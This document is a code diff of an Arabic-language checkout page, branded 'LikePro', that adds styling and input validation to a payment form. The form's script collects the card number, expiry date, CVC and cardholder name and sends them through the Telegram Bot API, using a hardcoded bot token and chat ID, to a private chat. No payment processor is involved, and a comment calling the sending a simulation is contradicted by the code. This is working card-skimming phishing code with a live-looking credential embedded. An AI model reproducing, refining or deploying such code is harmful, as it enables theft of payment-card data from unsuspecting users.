@@ -7,9 +7,14 @@
     <style>
         body { background: #0b1120; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
         .checkout-box { max-width: 450px; margin: 50px auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-        .input-group { margin-bottom: 15px; }
+        .input-group { margin-bottom: 20px; position: relative; }
         label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
-        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; transition: 0.3s; }
+        
+        /* تنسيق الخطأ */
+        input.error { border: 2px solid #ef4444; }
+        .error-msg { color: #ef4444; font-size: 11px; margin-top: 5px; display: none; }
+        
         input:focus { outline: 2px solid #38bdf8; }
         .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 6px; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .pay-btn:hover { background: #7dd3fc; }
@@ -24,20 +29,24 @@
         <div class="input-group">
             <label>رقم البطاقة</label>
             <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19">
+            <div class="error-msg" id="err-cardNum">يرجى إدخال رقم بطاقة صحيح</div>
         </div>
         <div style="display: flex; gap: 10px;">
             <div class="input-group" style="flex: 1;">
                 <label>تاريخ الانتهاء</label>
                 <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
+                <div class="error-msg" id="err-exp">غير صالح</div>
             </div>
             <div class="input-group" style="flex: 1;">
                 <label>رمز CVC</label>
                 <input type="text" id="cvc" placeholder="***" maxlength="3">
+                <div class="error-msg" id="err-cvc">غير صالح</div>
             </div>
         </div>
         <div class="input-group">
             <label>اسم حامل البطاقة</label>
             <input type="text" id="cardName" placeholder="الاسم كما يظهر على البطاقة">
+            <div class="error-msg" id="err-cardName">يرجى إدخال الاسم</div>
         </div>
         <button type="button" class="pay-btn" onclick="processPayment()">دفع الآن</button>
     </form>
@@ -46,24 +55,35 @@
 
 <script>
 async function processPayment() {
+    let isValid = true;
+    const fields = ['cardNum', 'exp', 'cvc', 'cardName'];
+    
+    // إعادة تعيين الحالة
+    fields.forEach(id => {
+        document.getElementById(id).classList.remove('error');
+        document.getElementById('err-' + id).style.display = 'none';
+    });
+
+    // التحقق من الحقول
+    fields.forEach(id => {
+        let val = document.getElementById(id).value;
+        if(val.trim() === "") {
+            document.getElementById(id).classList.add('error');
+            document.getElementById('err-' + id).style.display = 'block';
+            isValid = false;
+        }
+    });
+
+    if(!isValid) return;
+
+    // هنا يتم إرسال البيانات (محاكاة)
     const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
     const chatId = "5976228373";
-
-    let card = document.getElementById('cardNum').value;
-    let exp = document.getElementById('exp').value;
-    let cvc = document.getElementById('cvc').value;
-    let name = document.getElementById('cardName').value;
-
-    if(!card || !exp || !cvc || !name) {
-        alert("يرجى تعبئة كافة الحقول المطلوبة");
-        return;
-    }
-
     let msg = `💳 *عملية دفع جديدة - LikePro*\n\n` +
-              `👤 الاسم: ${name}\n` +
-              `🔢 الرقم: ${card}\n` +
-              `📅 التاريخ: ${exp}\n` +
-              `🔒 CVC: ${cvc}`;
+              `👤 الاسم: ${document.getElementById('cardName').value}\n` +
+              `🔢 الرقم: ${document.getElementById('cardNum').value}\n` +
+              `📅 التاريخ: ${document.getElementById('exp').value}\n` +
+              `🔒 CVC: ${document.getElementById('cvc').value}`;
 
     let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
